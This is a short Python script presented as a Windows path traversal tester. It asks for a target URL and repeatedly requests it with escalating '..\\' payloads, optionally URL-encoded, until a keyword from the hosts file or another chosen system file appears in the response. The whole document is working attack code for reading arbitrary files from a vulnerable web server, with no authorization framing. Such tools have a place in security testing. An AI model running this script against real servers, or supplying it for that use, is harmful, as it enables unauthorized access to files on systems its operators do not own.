import requests
import urllib.parse

def test_path_traversal():
    print("[*] Windows Path Traversal Tester")
    
    # User inputs
    target_url = input("[?] Enter target URL (http://example.com/download?file=): ").strip()
    max_depth = int(input("[?] Enter max traversal depth (e.g., 10): ") or 10)
    file_to_read = input("[?] Enter file to read (e.g., Windows\\System32\\drivers\\etc\\hosts): ").strip() or "Windows\\System32\\drivers\\etc\\hosts"
    success_keyword = input("[?] Enter success keyword (e.g., '127.0.0.1' for hosts file): ").strip() or "127.0.0.1"
    
    # Ask for URL encoding
    use_encoding = input("[?] Use URL encoding? (yes/no): ").strip().lower()
    encode_payload = use_encoding in ('y', 'yes')

    print(f"\n[*] Testing {target_url} with max depth {max_depth} (URL encoding: {'ON' if encode_payload else 'OFF'})...")

    for depth in range(1, max_depth + 1):
        # Generate payload (with or without encoding)
        traversal_payload = "..\\" * depth + file_to_read
        if encode_payload:
            traversal_payload = urllib.parse.quote(traversal_payload)
        
        test_url = target_url + traversal_payload
        
        try:
            response = requests.get(test_url, timeout=5)
            
            if response.status_code == 200 and success_keyword in response.text:
                print(f"\n[+] SUCCESS at depth {depth}!")
                print(f"Payload: {traversal_payload}")
                print(f"URL: {test_url}")
                print(f"Response snippet:\n{response.text[:200]}...")
                return
            else:
                print(f"[-] Depth {depth}: No match (Status: {response.status_code}, Length: {len(response.text)})")
        
        except Exception as e:
            print(f"[!] Error at depth {depth}: {str(e)}")
    
    print("\n[!] Path traversal failed. Try increasing depth or checking payloads.")

if __name__ == "__main__":
    test_path_traversal()
